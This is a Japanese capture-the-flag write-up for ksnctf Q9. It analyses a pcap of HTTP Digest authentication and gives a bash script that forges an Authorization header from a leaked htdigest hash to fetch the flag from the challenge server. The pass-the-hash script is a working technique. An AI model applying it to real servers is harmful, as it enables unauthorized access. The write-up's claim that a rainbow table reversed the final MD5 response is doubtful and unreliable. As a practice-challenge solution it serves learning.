Q9.Digest is secure! 150pt
--------------------------

問題
----
> http://ksnctf.sweetduet.info/q/9/q9.pcap

解き方
-----

pcap問題ですね。

wiresharkしても良いですが、この程度の量ならstringsして様子を見るのもありです。

```pcap
$ strings q9.pcap (主要部分のみ抜粋)
GET /~q9/ HTTP/1.1
Host: ctfq.sweetduet.info:10080
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.162 Safari/535.19
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: ja,en-US;q=0.8,en;q=0.6
Accept-Charset: Shift_JIS,utf-8;q=0.7,*;q=0.3

HTTP/1.1 401 Authorization Required
Date: Sat, 26 May 2012 20:54:42 GMT
Server: Apache/2.2.15 (CentOS)
WWW-Authenticate: Digest realm="secret", nonce="bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b", algorithm=MD5, qop="auth"
Content-Length: 489
Connection: close
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Authorization Required</title>
</head><body>
<h1>Authorization Required</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.2.15 (CentOS) Server at ctfq.sweetduet.info Port 10080</address>
</body></html>

GET /~q9/ HTTP/1.1
Host: ctfq.sweetduet.info:10080
Connection: keep-alive
Authorization: Digest username="q9", realm="secret", nonce="bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b", uri="/~q9/", algorithm=MD5, response="c3077454ecf09ecef1d6c1201038cfaf", qop=auth, nc=00000001, cnonce="9691c249745d94fc"
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.162 Safari/535.19
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: ja,en-US;q=0.8,en;q=0.6
Accept-Charset: Shift_JIS,utf-8;q=0.7,*;q=0.3

HTTP/1.1 200 OK
Date: Sat, 26 May 2012 20:54:45 GMT
Server: Apache/2.2.15 (CentOS)
Authentication-Info: rspauth="42b425bdd3ad27086858915611646f7c", cnonce="9691c249745d94fc", nc=00000001, qop=auth
Last-Modified: Sat, 26 May 2012 12:28:32 GMT
ETag: "422e2-c0-4c0ef9f82a6c7"
Accept-Ranges: bytes
Content-Length: 192
Connection: close
Content-Type: text/html; charset=UTF-8
<!DOCTYPE html>
  <head>
    <meta charset="utf-8">
    <title>Q9</title>
  </head>
  <body>
    <p>Congratulations!</p>
    <p>The flag is <a href="flag.html">here</a>.</p>
  </body>
</html>

GET /~q9/htdigest HTTP/1.1
Host: ctfq.sweetduet.info:10080
Connection: keep-alive
Authorization: Digest username="q9", realm="secret", nonce="bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b", uri="/~q9/htdigest", algorithm=MD5, response="d9f18946e5587401c303b34e00a059eb", qop=auth, nc=00000002, cnonce="6945eb2a7ba8cf7f"
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.162 Safari/535.19
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,sdch
Accept-Language: ja,en-US;q=0.8,en;q=0.6
Accept-Charset: Shift_JIS,utf-8;q=0.7,*;q=0.3

HTTP/1.1 200 OK
Date: Sat, 26 May 2012 20:54:53 GMT
Server: Apache/2.2.15 (CentOS)
Authentication-Info: rspauth="022023eac9b9e023d50cca5eef69c287", cnonce="6945eb2a7ba8cf7f", nc=00000002, qop=auth
Last-Modified: Sat, 26 May 2012 12:30:54 GMT
ETag: "422e4-2b-4c0efa7f441cf"
Accept-Ranges: bytes
Content-Length: 43
Connection: close
Content-Type: text/plain; charset=UTF-8
q9:secret:c627e19450db746b739f41b64097d449

```

次の順番で通信していることが分かります。
 1. 普通のリクエスト
 2. 401レスポンス
     - `WWW-Authenticate: Digest realm="secret", nonce="bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b", algorithm=MD5, qop="auth"`
 3. ID/PASSを入力
     - `Authorization: Digest username="q9", realm="secret", nonce="bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b", uri="/~q9/", algorithm=MD5, response="c3077454ecf09ecef1d6c1201038cfaf", qop=auth, nc=00000001, cnonce="9691c249745d94fc"`
 4. 200レスポンス

digest認証はresponseの値が計算しにくい(MD5)ことでメッセージの傍受に対して耐性があります。

responseの計算式は次の通りです。
```bash
response="$(MD5 $(MD5 "$username:$realm:$password"):$nonce:$nc:$cnonce:$qop:$(MD5 "$method:$URI"))"
```

ID/PASSの入力から最終的なresponse`c3077454ecf09ecef1d6c1201038cfaf`が分かっています。

上記の式の値をMD5したものが`c3077454ecf09ecef1d6c1201038cfaf`ですが、これはレインボーテーブルに存在します。

レインボーテーブルによるとこれをMD5逆変換したものは`c627e19450db746b739f41b64097d449:bbKtsfbABAA=5dad3cce7a7dd2c3335c9b400a19d6ad02df299b:00000001:9691c249745d94fc:auth:31e101310bcd7fae974b921eb148099c`のようです。単語の並びを見ても合っていそうです。

Digest認証では`$username`は必要ですが、`$(MD5 "$username:$realm:$password")`が既知の場合、`$password`は必要ないんですね。

pcapの内容に従って1, 2の流れを再現して、3のリクエストを構成すればよいです。

つまり、レスポンスから`$nonce`, `$qop`, `$algorithm`, `$realm`を取得して`$resnponce`を計算してもう一度リクエストを送信すればよいです。

```bash
#!/usr/bin/env bash
MD5_username_realm_password='c627e19450db746b739f41b64097d449'
MD5_method_uri="$(echo -n 'GET:/~q9/flag.html'|md5sum|sed -e's/ *-//')"

raw_nc='00000001'
raw_cnonce='9691c249745d94fc'
raw_qop='auth'

# get nonce
url='http://ksnctf.sweetduet.info:10080/~q9/flag.html'
res="$(curl -sS -v "$url" &>/dev/stdout)"
res="$(echo "$res"|sed -e's/\r/\n/g')"
digest=$(echo "$res"|grep 'WWW-Authenticate'|head -n 1)
raw_nonce="$(echo $digest|sed -e 's/.*nonce="\([0-9a-zA-Z=]*\)", .*/\1/')"

# create 'response'
response="$(echo -n "$MD5_username_realm_password:$raw_nonce:$raw_nc:$raw_cnonce:$raw_qop:$MD5_method_uri"|md5sum|sed -e's/ *-//')"
# create request header
qop='qop="auth"'
realm='realm="secret"'
username='username="q9"'
nonce='nonce="'"$raw_nonce"'"'
uri='uri="/~q9/flag.html"'
response='response="'"$response"'"'
nc='nc="'"$raw_nc"'"'
cnonce='cnonce="'"$raw_cnonce"'"'
realm='realm="secret"'

auth_header="Authorization: Digest $username, $realm, $nonce, $uri, algorithm=MD5, $response, $qop, $nc, $cnonce"

curl -sS "$url" -H "$auth_header"

```

```html
<!DOCTYPE html>
  <head>
    <meta charset="utf-8">
    <title>Q9</title>
  </head>
  <body>
    <p>FLAG_YBLyivV4WEvC4pp3</p>
  </body>
</html>
```

FLAG
-----
`FLAG_YBLyivV4WEvC4pp3`

